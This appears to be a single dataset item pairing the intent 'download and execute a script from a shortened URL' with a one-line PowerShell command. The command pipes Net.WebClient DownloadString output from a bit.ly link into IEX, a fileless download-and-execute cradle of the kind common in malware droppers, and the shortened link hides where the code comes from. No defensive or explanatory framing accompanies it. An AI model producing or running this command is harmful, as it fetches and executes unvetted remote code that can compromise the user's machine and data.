# Natural language intent:
# Download and execute a script from a shortened URL using PowerShell.

powershell.exe -c IEX (New-Object Net.Webclient).downloadstring("https://bit.ly/33H0QXi")
